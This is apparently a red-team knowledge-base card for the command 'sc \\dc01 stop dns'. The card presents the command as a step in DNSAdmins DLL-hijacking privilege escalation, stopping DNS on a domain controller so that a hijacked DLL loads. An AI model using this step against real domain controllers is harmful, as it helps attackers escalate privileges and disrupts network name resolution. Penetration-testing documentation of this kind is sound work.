---
id: 037550da-75ed-4365-81f6-70e56516b6ec
name: Stop-DNS-Service-DC01
type: command
executor: powershell
data: sc \\dc01 stop dns
output: null
created_at: '2023-04-06T03:56:06.475163+00:00'
updated_at: '2023-10-10T20:26:10.325254+00:00'
platforms:
  - Windows
tags:
  - service
  - management
verified: true
validated: true
---

# Stop-DNS-Service-DC01

## Command

```powershell
sc \\dc01 stop dns
```

## Description

Stops the DNS service on the specified Domain Controller to prepare for reloading the hijacked DLL.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| \\dc01 | Target server | Yes |
| stop | Action to stop service | Built-in |
| dns | Service name | Yes |

## Examples

### Basic Usage

```powershell
sc \\dc01 stop dns
```

## Expected Output

```
SERVICE_NAME: dns
        TYPE               : 20  WIN32_SHARE_PROCESS
        STATE              : 1  STOPPED
```

Service status changes to stopped.

## Related

- [[procedures/Abuse-DNSAdmins-for-DLL-Hijacking-Privilege-Escalation]]
